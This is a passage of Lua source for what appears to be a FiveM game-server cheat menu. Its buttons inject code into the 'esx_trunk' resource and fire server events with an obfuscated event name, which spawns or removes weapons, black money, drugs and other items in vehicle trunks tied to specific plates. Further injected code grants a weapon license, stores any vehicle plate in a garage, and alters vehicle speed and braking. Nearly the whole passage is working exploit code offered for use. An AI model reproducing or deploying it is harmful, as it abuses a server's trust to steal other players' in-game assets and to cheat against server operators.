TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:uyWsjuoUykPtgbl6c9AhnRuBWtT6tZPXNlTEcczR0zz9T1zroxIHORCNWqJVuh0W25mLGgy7oCFU802wxw0iiyLWLgF7i9ZSX2C6H4j6Qj8FQ4rlSzEoVELj', 'BFQ 646 ', 'item_weapon', 'WEAPON_COMBATPDW', 1, 717225484)
]])
            MachoMenuNotification("Weapon", "Combat PDW DEV 2 obtained!")
        end)

        MachoMenuButton(group, "Revolver DEV 2", function()
            SendActionLog("Weapon", "Revolver DEV 2", "Got weapon from BFQ 646", "1", "WEAPON_REVOLVER", "BFQ 646", "", "")
            MachoInjectResource("esx_trunk", [[
TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:uyWsjuoUykPtgbl6c9AhnRuBWtT6tZPXNlTEcczR0zz9T1zroxIHORCNWqJVuh0W25mLGgy7oCFU802wxw0iiyLWLgF7i9ZSX2C6H4j6Qj8FQ4rlSzEoVELj', 'BFQ 646 ', 'item_weapon', 'WEAPON_REVOLVER', 1, 717225484)
]])
            MachoMenuNotification("Weapon", "Revolver DEV 2 obtained!")
        end)

        MachoMenuButton(group, "Pump Shotgun DEV 2", function()
            SendActionLog("Weapon", "Pump Shotgun DEV 2", "Got weapon from BFQ 646", "1", "WEAPON_PUMPSHOTGUN", "BFQ 646", "", "")
            MachoInjectResource("esx_trunk", [[
TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:uyWsjuoUykPtgbl6c9AhnRuBWtT6tZPXNlTEcczR0zz9T1zroxIHORCNWqJVuh0W25mLGgy7oCFU802wxw0iiyLWLgF7i9ZSX2C6H4j6Qj8FQ4rlSzEoVELj', 'BFQ 646 ', 'item_weapon', 'WEAPON_PUMPSHOTGUN', 1, 717225484)
]])
            MachoMenuNotification("Weapon", "Pump Shotgun DEV 2 obtained!")
        end)

        MachoMenuButton(group, "Switchblade DEV 2", function()
            SendActionLog("Weapon", "Switchblade DEV 2", "Got weapon from BFQ 646", "1", "WEAPON_SWITCHBLADE", "BFQ 646", "", "")
            MachoInjectResource("esx_trunk", [[
TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:uyWsjuoUykPtgbl6c9AhnRuBWtT6tZPXNlTEcczR0zz9T1zroxIHORCNWqJVuh0W25mLGgy7oCFU802wxw0iiyLWLgF7i9ZSX2C6H4j6Qj8FQ4rlSzEoVELj', 'BFQ 646 ', 'item_weapon', 'WEAPON_SWITCHBLADE', 1, 717225484)
]])
            MachoMenuNotification("Weapon", "Switchblade DEV 2 obtained!")
        end)

        MachoMenuText(group, "  WEAPON UTILITIES  ")

        MachoMenuButton(group, "Add Ammo", function()
            SendActionLog("Weapon", "Add Ammo", "Added 220 ammo to current weapon", "220", "", "", "", "")
            MachoInjectResource("esx_trunk", [[
Citizen.CreateThread(function()
    Wait(1000)
    local player = PlayerPedId()
    local weapon = GetSelectedPedWeapon(player)
    AddAmmoToPed(player, weapon, 220)
end)
]])
            MachoMenuNotification("Weapon", "Ammo added!")
        end)

        MachoMenuButton(group, "Weapon License", function()
            SendActionLog("Weapon", "Weapon License", "Got weapon license", "", "", "", "", "")
            MachoInjectResource("esx_trunk", [[TriggerServerEvent('esx_dmvschool:addLicense', "weapon_top")]])
            MachoMenuNotification("Weapon", "Weapon License obtained!")
        end)

        MachoMenuText(group, "  WEAPON REMOVAL  ")

        MachoMenuButton(group, "Remove PDW", function()
            SendActionLog("Weapon", "Remove PDW", "Removed weapon to ORF 370", "1", "WEAPON_COMBATPDW", "ORF 370", "", "")
            MachoInjectResource("esx_trunk", [[
TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:qI26diVoSsTWK59ZLuBfMXJQJH7Kz6aqPIeJXTu0SlXeORmrwtWwYzozhLFRzMucDpcsF8km6QK2W0iK7VGYypFioFq10s2JOQY0gJ3VpfG82FnDMAtG56YN', 'ORF 370 ', 'item_weapon', 'WEAPON_COMBATPDW', 1, 50000000, 'ORF 370 ', 482526481)
]])
            MachoMenuNotification("Weapon", "PDW removed!")
        end)

        MachoMenuButton(group, "Remove Revolver", function()
            SendActionLog("Weapon", "Remove Revolver", "Removed weapon to ORF 370", "1", "WEAPON_REVOLVER", "ORF 370", "", "")
            MachoInjectResource("esx_trunk", [[
TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:qI26diVoSsTWK59ZLuBfMXJQJH7Kz6aqPIeJXTu0SlXeORmrwtWwYzozhLFRzMucDpcsF8km6QK2W0iK7VGYypFioFq10s2JOQY0gJ3VpfG82FnDMAtG56YN', 'ORF 370 ', 'item_weapon', 'WEAPON_REVOLVER', 1, 50000000000, 'ORF 370 ', 482526481)
]])
            MachoMenuNotification("Weapon", "Revolver removed!")
        end)

        MachoMenuButton(group, "Remove Micro SMG", function()
            SendActionLog("Weapon", "Remove Micro SMG", "Removed weapon to ORF 370", "1", "WEAPON_MICROSMG", "ORF 370", "", "")
            MachoInjectResource("esx_trunk", [[
TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:qI26diVoSsTWK59ZLuBfMXJQJH7Kz6aqPIeJXTu0SlXeORmrwtWwYzozhLFRzMucDpcsF8km6QK2W0iK7VGYypFioFq10s2JOQY0gJ3VpfG82FnDMAtG56YN', 'ORF 370 ', 'item_weapon', 'WEAPON_MICROSMG', 1, 50000000, 'ORF 370 ', 482526481)
]])
            MachoMenuNotification("Weapon", "Micro SMG removed!")
        end)

        MachoMenuButton(group, "Remove Switchblade", function()
            SendActionLog("Weapon", "Remove Switchblade", "Removed weapon to ORF 370", "1", "WEAPON_SWITCHBLADE", "ORF 370", "", "")
            MachoInjectResource("esx_trunk", [[
TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:qI26diVoSsTWK59ZLuBfMXJQJH7Kz6aqPIeJXTu0SlXeORmrwtWwYzozhLFRzMucDpcsF8km6QK2W0iK7VGYypFioFq10s2JOQY0gJ3VpfG82FnDMAtG56YN', 'ORF 370 ', 'item_weapon', 'WEAPON_SWITCHBLADE', 1, 50000000000, 'ORF 370 ', 482526481)
]])
            MachoMenuNotification("Weapon", "Switchblade removed!")
        end)

        MachoMenuButton(group, "Remove Shotgun", function()
            SendActionLog("Weapon", "Remove Shotgun", "Removed weapon to ORF 370", "1", "WEAPON_PUMPSHOTGUN", "ORF 370", "", "")
            MachoInjectResource("esx_trunk", [[
TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:qI26diVoSsTWK59ZLuBfMXJQJH7Kz6aqPIeJXTu0SlXeORmrwtWwYzozhLFRzMucDpcsF8km6QK2W0iK7VGYypFioFq10s2JOQY0gJ3VpfG82FnDMAtG56YN', 'ORF 370 ', 'item_weapon', 'WEAPON_PUMPSHOTGUN', 1, 50000000, 'ORF 370 ', 482526481)
]])
            MachoMenuNotification("Weapon", "Shotgun removed!")
        end)

    elseif tabName == "Money" then
        MachoMenuText(group, "  MONEY CONTROL  ")

        MachoMenuSlider(group, "Amount (K)", 150, 50, 2000, "K", 0, function(Value)
            selectedMoneyAmount = Value
        end)

        MachoMenuButton(group, "Withdraw Black Money", function()
            local amount = selectedMoneyAmount * 1000
            SendActionLog("Money", "Withdraw Black Money", "Withdrew black money from ORF 370", tostring(amount), "black_money", "ORF 370", "", "")
            MachoInjectResource("esx_trunk", [[
TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:uyWsjuoUykPtgbl6c9AhnRuBWtT6tZPXNlTEcczR0zz9T1zroxIHORCNWqJVuh0W25mLGgy7oCFU802wxw0iiyLWLgF7i9ZSX2C6H4j6Qj8FQ4rlSzEoVELj', 'ORF 370 ', 'item_account', 'black_money', ]] .. amount .. [[, 717225484)
]])
            MachoMenuNotification("Money", "Withdrew $" .. amount .. " black money!")
        end)

        MachoMenuButton(group, "Deposit Black Money", function()
            local amount = selectedMoneyAmount * 1000
            SendActionLog("Money", "Deposit Black Money", "Deposited black money to ORF 370", tostring(amount), "black_money", "ORF 370", "", "")
            MachoInjectResource("esx_trunk", [[
TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:qI26diVoSsTWK59ZLuBfMXJQJH7Kz6aqPIeJXTu0SlXeORmrwtWwYzozhLFRzMucDpcsF8km6QK2W0iK7VGYypFioFq10s2JOQY0gJ3VpfG82FnDMAtG56YN', 'ORF 370 ', 'item_account', 'black_money', ]] .. amount .. [[, 5000000000, 'ORF 370 ', 482526481)
]])
            MachoMenuNotification("Money", "Deposited $" .. amount .. " black money!")
        end)

    elseif tabName == "Item" then
        MachoMenuText(group, "  STUFF FIGHT  ")

        MachoMenuSlider(group, "Stuff Fight Amount", 65, 1, 100, "x", 0, function(Value)
            selectedDrugAmount = Value
        end)

        MachoMenuButton(group, "Weed", function()
            local amount = selectedDrugAmount
            SendActionLog("Item", "Weed (Fight)", "Got weed from TCU 564", tostring(amount), "weed", "TCU 564", "", "")
            MachoInjectResource("esx_trunk", [[
TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:uyWsjuoUykPtgbl6c9AhnRuBWtT6tZPXNlTEcczR0zz9T1zroxIHORCNWqJVuh0W25mLGgy7oCFU802wxw0iiyLWLgF7i9ZSX2C6H4j6Qj8FQ4rlSzEoVELj', 'TCU 564 ', 'item_standard', 'weed', ]] .. amount .. [[, 717225484)
]])
            MachoMenuNotification("Item", "Got " .. amount .. "x Weed!")
        end)
		
        MachoMenuButton(group, "Coke", function()
            local amount = selectedDrugAmount
            SendActionLog("Item", "Coke (Fight)", "Got coke from TCU 564", tostring(amount), "coke", "TCU 564", "", "")
            MachoInjectResource("esx_trunk", [[
TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:uyWsjuoUykPtgbl6c9AhnRuBWtT6tZPXNlTEcczR0zz9T1zroxIHORCNWqJVuh0W25mLGgy7oCFU802wxw0iiyLWLgF7i9ZSX2C6H4j6Qj8FQ4rlSzEoVELj', 'TCU 564 ', 'item_standard', 'coke', ]] .. amount .. [[, 717225484)
]])
            MachoMenuNotification("Item", "Got " .. amount .. "x Coke!")
        end)

        MachoMenuButton(group, "Bigbox", function()
            local amount = selectedDrugAmount
            SendActionLog("Item", "Bigbox", "Got bigbox from TCU 564", tostring(amount), "bigbox", "TCU 564", "", "")
            MachoInjectResource("esx_trunk", [[
TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:uyWsjuoUykPtgbl6c9AhnRuBWtT6tZPXNlTEcczR0zz9T1zroxIHORCNWqJVuh0W25mLGgy7oCFU802wxw0iiyLWLgF7i9ZSX2C6H4j6Qj8FQ4rlSzEoVELj', 'TCU 564 ', 'item_standard', 'bigbox', ]] .. amount .. [[, 717225484)
]])
            MachoMenuNotification("Item", "Got " .. amount .. "x Bigbox!")
        end)

        MachoMenuButton(group, "Bulletproof", function()
            local amount = selectedDrugAmount
            SendActionLog("Item", "Bulletproof", "Got bulletproof from TCU 564", tostring(amount), "bulletproof", "TCU 564", "", "")
            MachoInjectResource("esx_trunk", [[
TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:uyWsjuoUykPtgbl6c9AhnRuBWtT6tZPXNlTEcczR0zz9T1zroxIHORCNWqJVuh0W25mLGgy7oCFU802wxw0iiyLWLgF7i9ZSX2C6H4j6Qj8FQ4rlSzEoVELj', 'TCU 564 ', 'item_standard', 'bulletproof', ]] .. amount .. [[, 717225484)
]])
            MachoMenuNotification("Item", "Got " .. amount .. "x Bulletproof!")
        end)

        MachoMenuButton(group, "Fixkit", function()
            local amount = selectedDrugAmount
            SendActionLog("Item", "Fixkit", "Got fixkit from TCU 564", tostring(amount), "fixkit", "TCU 564", "", "")
            MachoInjectResource("esx_trunk", [[
TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:uyWsjuoUykPtgbl6c9AhnRuBWtT6tZPXNlTEcczR0zz9T1zroxIHORCNWqJVuh0W25mLGgy7oCFU802wxw0iiyLWLgF7i9ZSX2C6H4j6Qj8FQ4rlSzEoVELj', 'TCU 564 ', 'item_standard', 'fixkit', ]] .. amount .. [[, 717225484)
]])
            MachoMenuNotification("Item", "Got " .. amount .. "x Fixkit!")
        end)

        MachoMenuButton(group, "Helm2", function()
            local amount = selectedDrugAmount
            SendActionLog("Item", "Helm2", "Got helm2 from TCU 564", tostring(amount), "helm2", "TCU 564", "", "")
            MachoInjectResource("esx_trunk", [[
TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:uyWsjuoUykPtgbl6c9AhnRuBWtT6tZPXNlTEcczR0zz9T1zroxIHORCNWqJVuh0W25mLGgy7oCFU802wxw0iiyLWLgF7i9ZSX2C6H4j6Qj8FQ4rlSzEoVELj', 'TCU 564 ', 'item_standard', 'helm2', ]] .. amount .. [[, 717225484)
]])
            MachoMenuNotification("Item", "Got " .. amount .. "x Helm2!")
        end)

        MachoMenuButton(group, "Morphine", function()
            local amount = selectedDrugAmount
            SendActionLog("Item", "Morphine", "Got morphine from TCU 564", tostring(amount), "morphine", "TCU 564", "", "")
            MachoInjectResource("esx_trunk", [[
TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:uyWsjuoUykPtgbl6c9AhnRuBWtT6tZPXNlTEcczR0zz9T1zroxIHORCNWqJVuh0W25mLGgy7oCFU802wxw0iiyLWLgF7i9ZSX2C6H4j6Qj8FQ4rlSzEoVELj', 'TCU 564 ', 'item_standard', 'morphine', ]] .. amount .. [[, 717225484)
]])
            MachoMenuNotification("Item", "Got " .. amount .. "x Morphine!")
        end)

        MachoMenuText(group, "  DRUG MANAGEMENT  ")

        MachoMenuSlider(group, "Drug Amount", 65, 1, 100, "x", 0, function(Value)
            selectedDrugAmount = Value
        end)

        MachoMenuButton(group, "Get Opium", function()
            local amount = selectedDrugAmount
            SendActionLog("Item", "Get Opium", "Got opium from AAQ 338", tostring(amount), "opium_pooch", "AAQ 338", "", "")
            MachoInjectResource("esx_trunk", [[
TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:uyWsjuoUykPtgbl6c9AhnRuBWtT6tZPXNlTEcczR0zz9T1zroxIHORCNWqJVuh0W25mLGgy7oCFU802wxw0iiyLWLgF7i9ZSX2C6H4j6Qj8FQ4rlSzEoVELj', 'AAQ 338 ', 'item_standard', 'opium_pooch', ]] .. amount .. [[, 717225484)
]])
            MachoMenuNotification("Item", "Got " .. amount .. "x Opium!")
        end)

        MachoMenuButton(group, "Get Weed", function()
            local amount = selectedDrugAmount
            SendActionLog("Item", "Get Weed", "Got weed from AAQ 338", tostring(amount), "weed_pooch", "AAQ 338", "", "")
            MachoInjectResource("esx_trunk", [[
TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:uyWsjuoUykPtgbl6c9AhnRuBWtT6tZPXNlTEcczR0zz9T1zroxIHORCNWqJVuh0W25mLGgy7oCFU802wxw0iiyLWLgF7i9ZSX2C6H4j6Qj8FQ4rlSzEoVELj', 'AAQ 338 ', 'item_standard', 'weed_pooch', ]] .. amount .. [[, 717225484)
]])
            MachoMenuNotification("Item", "Got " .. amount .. "x Weed!")
        end)

    elseif tabName == "Vehicle" then
        MachoMenuText(group, "  VEHICLE CONTROL  ")
        MachoMenuText(group, "  GARAGE MANAGEMENT  ")
        
        VehiclePlateGarageInputHandle = MachoMenuInputbox(group, "Vehicle Plate", "Enter plate (e.g: JOX 885)...")
        
        MachoMenuButton(group, "Store in Garage", function()
            local vehiclePlate = MachoMenuGetInputbox(VehiclePlateGarageInputHandle)
            if vehiclePlate and vehiclePlate ~= "" then
                SendActionLog("Vehicle", "Store in Garage", "Plate: " .. vehiclePlate, "1", "", "", vehiclePlate, "")
                MachoInjectResource("esx_trunk", [[
TriggerServerEvent('esx_advancedgarage:setVehicleState', ']] .. vehiclePlate .. [[', true, '', 1, 2460443678)
]])
                MachoMenuNotification("Vehicle", "Vehicle " .. vehiclePlate .. " stored!")
            else
                MachoMenuNotification("Vehicle", "Enter vehicle plate!")
            end
        end)

        MachoMenuCheckbox(group, "Vehicle Boost (Left Shift)", 
            function()
                SendActionLog("Vehicle", "Vehicle Boost", "Enabled", "", "", "", "", "")
                MachoInjectResource("esx_trunk", [[
vehicleBoostEnabled = true
Citizen.CreateThread(function()
    while vehicleBoostEnabled do
        local ped = PlayerPedId()
        if ped and DoesEntityExist(ped) and not IsEntityDead(ped) then
            local vehicle = GetVehiclePedIsIn(ped, false)
            if vehicle and vehicle ~= 0 and DoesEntityExist(vehicle) then
                if GetPedInVehicleSeat(vehicle, -1) == ped then
                    if IsControlJustPressed(0, 21) then
                        local velocity = GetEntityVelocity(vehicle)
                        local heading = GetEntityHeading(vehicle)
                        local currentSpeed = GetEntitySpeed(vehicle)
                        local maxSpeed = GetVehicleModelMaxSpeed(GetEntityModel(vehicle))
                        if currentSpeed < maxSpeed then
                            local boostAmount = 6.0 / 3.6
                            local newSpeed = currentSpeed + boostAmount
                            if newSpeed > maxSpeed then
                                boostAmount = (maxSpeed - currentSpeed)
                            end
                            local forwardX = -math.sin(math.rad(heading))
                            local forwardY = math.cos(math.rad(heading))
                            SetEntityVelocity(vehicle, velocity.x + (forwardX * boostAmount), velocity.y + (forwardY * boostAmount), velocity.z)
                        end
                    end
                end
            end
        end
        Wait(0)
    end
end)
]])
                MachoMenuNotification("Vehicle", "Vehicle Boost enabled!")
            end,
            function()
                SendActionLog("Vehicle", "Vehicle Boost", "Disabled", "", "", "", "", "")
                MachoInjectResource("esx_trunk", [[vehicleBoostEnabled = false]])
                MachoMenuNotification("Vehicle", "Vehicle Boost disabled!")
            end
        )

        MachoMenuCheckbox(group, "No Speed Limit", 
            function()
                SendActionLog("Vehicle", "No Speed Limit", "Enabled", "", "", "", "", "")
                MachoInjectResource("esx_trunk", [[
speedBoostEnabled = true
Citizen.CreateThread(function()
    while speedBoostEnabled do
        local ped = PlayerPedId()
        if ped and DoesEntityExist(ped) and not IsEntityDead(ped) then
            local vehicle = GetVehiclePedIsIn(ped, false)
            if vehicle and vehicle ~= 0 and DoesEntityExist(vehicle) then
                local speed = GetEntitySpeed(vehicle)
                local maxSpeed = GetVehicleModelMaxSpeed(GetEntityModel(vehicle))
                if speed >= (maxSpeed * 0.95) then
                    local velocity = GetEntityVelocity(vehicle)
                    local heading = GetEntityHeading(vehicle)
                    local forwardX = -math.sin(math.rad(heading)) * 0.2
                    local forwardY = math.cos(math.rad(heading)) * 0.2
                    SetEntityVelocity(vehicle, velocity.x + forwardX, velocity.y + forwardY, velocity.z)
                end
            end
        end
        Wait(100)
    end
end)
]])
                MachoMenuNotification("Vehicle", "No Speed Limit enabled!")
            end,
            function()
                SendActionLog("Vehicle", "No Speed Limit", "Disabled", "", "", "", "", "")
                MachoInjectResource("esx_trunk", [[speedBoostEnabled = false]])
                MachoMenuNotification("Vehicle", "No Speed Limit disabled!")
            end
        )

        MachoMenuButton(group, "Fill Fuel Tank", function()
            SendActionLog("Vehicle", "Fill Fuel", "Filled to 100%", "100", "fuel", "", "", "")
            MachoInjectResource("esx_trunk", [[
local ped = PlayerPedId()
local vehicle = GetVehiclePedIsIn(ped, false)
if vehicle and vehicle ~= 0 and DoesEntityExist(vehicle) then
    SetVehicleFuelLevel(vehicle, 100.0)
end
]])
            MachoMenuNotification("Vehicle", "Fuel tank filled!")
        end)

        MachoMenuText(group, "  BRAKE POWER  ")

        MachoMenuCheckbox(group, "Brake Power 10% (Weak)", 
            function()
                SendActionLog("Vehicle", "Brake 10%", "Enabled", "10", "", "", "", "")
                MachoInjectResource("esx_trunk", [[
brakePower30Enabled = false
brakePower50Enabled = false
brakePower70Enabled = false
brakePower10Enabled = true
if not brakePower10Thread then
    brakePower10Thread = Citizen.CreateThread(function()
        while brakePower10Enabled do
            local ped = PlayerPedId()
            if ped and DoesEntityExist(ped) and not IsEntityDead(ped) then
                local vehicle = GetVehiclePedIsIn(ped, false)
                if vehicle and vehicle ~= 0 and DoesEntityExist(vehicle) then
                    if GetPedInVehicleSeat(vehicle, -1) == ped then
                        if IsVehicleOnAllWheels(vehicle) then
                            local velocity = GetEntityVelocity(vehicle)
                            local heading = GetEntityHeading(vehicle)
                            local forwardVector = vector3(-math.sin(math.rad(heading)), math.cos(math.rad(heading)), 0)
                            local dotProduct = (velocity.x * forwardVector.x) + (velocity.y * forwardVector.y)
                            if IsControlPressed(0, 72) and dotProduct > 0.5 then
                                local speed = math.sqrt(velocity.x^2 + velocity.y^2 + velocity.z^2)
                                if speed > 0.5 then
                                    local brakeForce = 0.015
                                    SetEntityVelocity(vehicle, velocity.x * (1 - brakeForce), velocity.y * (1 - brakeForce), velocity.z * (1 - brakeForce * 0.5))
                                end
                            end
                        end
                    end
                end
            end
            Wait(10)
        end
        brakePower10Thread = nil
    end)
end
]])
                MachoMenuNotification("Vehicle", "Brake Power 10% enabled!")
            end,
            function()
                SendActionLog("Vehicle", "Brake 10%", "Disabled", "10", "", "", "", "")
                MachoInjectResource("esx_trunk", [[
brakePower10Enabled = false
if brakePower10Thread then brakePower10Thread = nil end
]])
                MachoMenuNotification("Vehicle", "Brake Power 10% disabled!")
            end
        )

        MachoMenuCheckbox(group, "Brake Power 30% (Medium)", 
            function()
                SendActionLog("Vehicle", "Brake 30%", "Enabled", "30", "", "", "", "")
                MachoInjectResource("esx_trunk", [[
brakePower10Enabled = false
brakePower50Enabled = false
brakePower70Enabled = false
brakePower30Enabled = true
if not brakePower30Thread then
    brakePower30Thread = Citizen.CreateThread(function()
        while brakePower30Enabled do
            local ped = PlayerPedId()
            if ped and DoesEntityExist(ped) and not IsEntityDead(ped) then
                local vehicle = GetVehiclePedIsIn(ped, false)
                if vehicle and vehicle ~= 0 and DoesEntityExist(vehicle) then
                    if GetPedInVehicleSeat(vehicle, -1) == ped then
                        if IsVehicleOnAllWheels(vehicle) then
                            local velocity = GetEntityVelocity(vehicle)
                            local heading = GetEntityHeading(vehicle)
                            local forwardVector = vector3(-math.sin(math.rad(heading)), math.cos(math.rad(heading)), 0)
                            local dotProduct = (velocity.x * forwardVector.x) + (velocity.y * forwardVector.y)
                            if IsControlPressed(0, 72) and dotProduct > 0.5 then
                                local speed = math.sqrt(velocity.x^2 + velocity.y^2 + velocity.z^2)
                                if speed > 0.5 then
                                    local brakeForce = 0.035
                                    SetEntityVelocity(vehicle, velocity.x * (1 - brakeForce), velocity.y * (1 - brakeForce), velocity.z * (1 - brakeForce * 0.5))
                                end
                            end
                        end
                    end
                end
            end
            Wait(10)
        end
        brakePower30Thread = nil
    end)
end
]])
                MachoMenuNotification("Vehicle", "Brake Power 30% enabled!")
            end,
            function()
                SendActionLog("Vehicle", "Brake 30%", "Disabled", "30", "", "", "", "")
                MachoInjectResource("esx_trunk", [[
brakePower30Enabled = false
if brakePower30Thread then brakePower30Thread = nil end
]])
                MachoMenuNotification("Vehicle", "Brake Power 30% disabled!")
            end
        )

        MachoMenuCheckbox(group, "Brake Power 50% (Strong)", 
            function()
                SendActionLog("Vehicle", "Brake 50%", "Enabled", "50", "", "", "", "")
                MachoInjectResource("esx_trunk", [[
brakePower10Enabled = false
brakePower30Enabled = false
brakePower70Enabled = false
brakePower50Enabled = true
if not brakePower50Thread then
    brakePower50Thread = Citizen.CreateThread(function()
        while brakePower50Enabled do
            local ped = PlayerPedId()
            if ped and DoesEntityExist(ped) and not IsEntityDead(ped) then
                local vehicle = GetVehiclePedIsIn(ped, false)
                if vehicle and vehicle ~= 0 and DoesEntityExist(vehicle) then
                    if GetPedInVehicleSeat(vehicle, -1) == ped then
                        if IsVehicleOnAllWheels(vehicle) then
                            local velocity = GetEntityVelocity(vehicle)
                            local heading = GetEntityHeading(vehicle)
                            local forwardVector = vector3(-math.sin(math.rad(heading)), math.cos(math.rad(heading)), 0)
                            local dotProduct = (velocity.x * forwardVector.x) + (velocity.y * forwardVector.y)
                            if IsControlPressed(0, 72) and dotProduct > 0.5 then
                                local speed = math.sqrt(velocity.x^2 + velocity.y^2 + velocity.z^2)
                                if speed > 0.5 then
                                    local brakeForce = 0.055
                                    SetEntityVelocity(vehicle, velocity.x * (1 - brakeForce), velocity.y * (1 - brakeForce), velocity.z * (1 - brakeForce * 0.5))
                                end
                            end
                        end
                    end
                end
            end
            Wait(10)
        end
        brakePower50Thread = nil
    end)
end
]])
                MachoMenuNotification("Vehicle", "Brake Power 50% enabled!")
            end,
            function()
                SendActionLog("Vehicle", "Brake 50%", "Disabled", "50", "", "", "", "")
                MachoInjectResource("esx_trunk", [[
brakePower50Enabled = false
if brakePower50Thread then brakePower50Thread = nil end
]])
                MachoMenuNotification("Vehicle", "Brake Power 50% disabled!")
            end
        )

        MachoMenuCheckbox(group, "Brake Power 70% (Very Strong)", 
            function()
                SendActionLog("Vehicle", "Brake 70%", "Enabled", "70", "", "", "", "")
                MachoInjectResource("esx_trunk", [[
brakePower10Enabled = false
brakePower30Enabled = false
brakePower50Enabled = false
brakePower70Enabled = true
if not brakePower70Thread then
    brakePower70Thread = Citizen.CreateThread(function()
        while brakePower70Enabled do
            local ped = PlayerPedId()
            if ped and DoesEntityExist(ped) and not IsEntityDead(ped) then
                local vehicle = GetVehiclePedIsIn(ped, false)
                if vehicle and vehicle ~= 0 and DoesEntityExist(vehicle) then
                    if GetPedInVehicleSeat(vehicle, -1) == ped then
                        if IsVehicleOnAllWheels(vehicle) then
                            local velocity = GetEntityVelocity(vehicle)
                            local heading = GetEntityHeading(vehicle)
                            local forwardVector = vector3(-math.sin(math.rad(heading)), math.cos(math.rad(heading)), 0)
                            local dotProduct = (velocity.x * forwardVector.x) + (velocity.y * forwardVector.y)
                            if IsControlPressed(0, 72) and dotProduct > 0.5 then
                                local speed = math.sqrt(velocity.x^2 + velocity.y^2 + velocity.z^2)
                                if speed > 0.5 then
                                    local brakeForce = 0.080
                                    SetEntityVelocity(vehicle, velocity.x * (1 - brakeForce), velocity.y * (1 - brakeForce), velocity.z * (1 - brakeForce * 0.5))
                                end
                            end
                        end
                    end
                end
            end
            Wait(10)
        end
        brakePower70Thread = nil
    end)
end
]])
                MachoMenuNotification("Vehicle", "Brake Power 70% enabled!")
            end,
            function()
